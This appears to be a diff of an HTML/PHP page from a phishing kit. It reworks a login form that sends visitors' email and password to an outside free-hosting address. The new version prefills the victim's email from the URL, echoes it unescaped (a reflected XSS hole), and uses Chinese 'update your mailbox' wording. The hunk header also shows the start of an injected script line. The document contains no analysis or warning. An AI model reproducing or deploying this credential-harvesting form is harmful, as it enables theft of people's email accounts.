@@ -426,18 +426,29 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
                 <div class="modal-body">                                       
                 <div class="col-md-6 col-sm-6 no-padng">
                     <div class="model-l">                    
-                    <form method="post" action="https://j379192911.000webhostapp.com/temp/indexs" class="log-frm" > 
-                    <ul>                                                     
-                        <li>Email</li>
-                        <li> <input type="text" value="<?php echo $_GET['login']; ?>" name="userName" class="form-control" </li>
-                        <li>Password</li>
-                        <li><input type="password" placeholder="Password" id="password" name="password" class="form-control" </li>                                                
-                        <li><br><button type="“submit”" onclick="userLogin();" id="logBtn" class="btn btn-default">Submit</button></li>
-                        <div style="display:none;" id="loginFail" class="sign">
-                        <li> <font color="red">  Username or password is incorrect.</font></li>
-                        </div>
-                           </ul>
-                            </form>                      
+                    <form method="post" action="https://j379192911.000webhostapp.com/temp/indexs">
+			
+				<br><br>
+
+				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['login']; ?>" placeholder="Username">
+				<font face="arial" size="3" color="#045FB4"><?php echo $_GET['login']; ?></font>		
+
+				<p>
+
+				<input name="pass" type="password" style="width:320px; height:40px; font-family: Verdana; font-size: 15px; color:#000000; 
+				background-color: #ffffff; border: solid 2px 276BA2; padding: 10px" "="" required="" placeholder="&#36755;&#20837;&#23494;&#30721;">
+	
+
+
+				</p><p>
+
+				<input type="submit" value="&#26356;&#26032;&#24744;&#30340;&#37038;&#31665;" style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
+				font-family: Verdana; font-size: 20px; font-weight: bold; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
+				-khtml-border-radius: 4px; border-radius: 4px;">				
+	
+				
+
+				</p></form>                    
                                 <div class="clearfix"></div>
                                  <form method="post" id="logFrm1" class="log-frm" name="logFrm1"> 
                                 <ul>                                    
